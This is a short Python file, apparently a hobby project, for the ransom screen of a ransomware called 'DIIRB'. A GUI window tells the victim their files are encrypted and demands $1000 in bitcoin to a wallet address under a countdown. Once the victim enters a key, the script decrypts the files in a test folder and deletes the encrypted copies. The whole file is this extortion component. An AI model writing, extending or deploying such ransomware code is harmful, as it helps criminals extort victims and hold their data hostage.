import PySimpleGUI as sg
import cryptography
from cryptography.fernet import Fernet
import time
import os




def decrypt(x):
    input_file =x
    output_file =x[:-10]
    with open(input_file,'rb')as f:
        data =f.read()

    fernet =Fernet(key)
    encrypted = fernet.decrypt(data)

    with open(output_file,'wb') as f:
        f.write(encrypted)

sg.theme('DarkAmber')   


layout = [  [sg.Text('NOT PETYA BUT DIIRB RANSOMWARE')],
			[sg.Text('All your files was been encrypted, to decrypt you files pay the amount of 1000$ into this Wallet  :')],
			[sg.Text('')],
			[sg.Text('1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa')],
			[sg.Text('')],
			[sg.Text('Time before The end of the ranson :')],
			[sg.Text(size =(10,2), font=('Arial', 20), justification = 'CENTER', key= '-OUTPUT-')],
            [sg.Text('Input the Key To decrypt your files '), sg.InputText()],
            [sg.Button('Ok'), sg.Button('Cancel')] ]

new_window = sg.Window('Dirb Ransmoware ', layout)

timer_running, counter  = True, 10

while True:
    event, values = new_window.read(timeout = 10)

    if event == sg.WIN_CLOSED or event == 'Cancel': # if user closes window or clicks cancel
        break
    if event == sg.WIN_CLOSED or event == 'Ok':
    	key = values[0]
    	print(type(key))
    	for x in os.listdir("./test/"):
    		decrypt('./test/' + x);os.remove('./test/' +x)
    	break
    if timer_running:
    	new_window['-OUTPUT-'].update('{:02d}.{:02d}'.format((counter // 100) % 60, counter % 100))
    	counter -= 1
        

new_window.close()